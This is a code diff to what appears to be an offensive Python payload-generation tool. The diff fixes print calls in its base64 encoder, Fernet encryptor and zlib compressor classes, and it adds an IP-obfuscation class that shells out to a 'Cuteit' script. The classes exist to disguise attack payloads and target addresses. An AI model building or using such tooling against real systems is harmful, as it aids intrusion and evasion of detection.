@@ -5,10 +5,11 @@ import zlib
 import socket
 import subprocess
 import ast
+import os
 
 class PayloadGenerator:
     def __init__(self):
-        print("\033[1;32;40m Generating payload\033[m",file)
+        print("\033[1;32;40m Generating payload\033[m")
         self.url = input("Enter the URL: ")
         self.ip = socket.gethostbyname(self.url)
         self.port = input("Enter the port: ")
@@ -24,7 +25,7 @@ class Encoder:
         self.payload = payload
 
     def base64_encode(self):
-        print("\033[1;32;40m Base64 Encoder \033[m",file)
+        print("\033[1;32;40m Base64 Encoder \033[m")
         print("Payload: ",self.payload)
         encoded_payload = base64.b64encode(self.payload.decode().encode())
         print("Base64 encoded payload: ", encoded_payload)
@@ -39,7 +40,7 @@ class Encryptor:
         self.key = key
 
     def aes_encrypt(self):
-        print("\033[1;32;40m AES ENCRYPTOR\033[m",file)
+        print("\033[1;32;40m AES ENCRYPTOR\033[m")
         import os
         from cryptography.fernet import Fernet
         from cryptography.hazmat.backends import default_backend
@@ -67,7 +68,20 @@ class Compressor:
         self.payload = payload
 
     def deflate(self):
-        print("\033[1;32;40m Compressor \033[m",file)
+        print("\033[1;32;40m Compressor \033[m")
         compressed_payload = zlib.compress(self.payload.decode().encode())
         print("Deflated payload: ", compressed_payload)
         return compressed_payload
+      
+      
+class IPobfuscator:
+    def __init__(self):
+        print("\033[1;32;40m Obfuscating IP\033[m")
+        self.url = input("Enter the URL: ")
+        self.ip = socket.gethostbyname(self.url)
+        
+    def cuteit(self):
+        path = "Cuteit/"
+        script = "Cuteit.py"
+        os.system(f"python3 {os.path.join(path, script)} {self.ip}")
+        
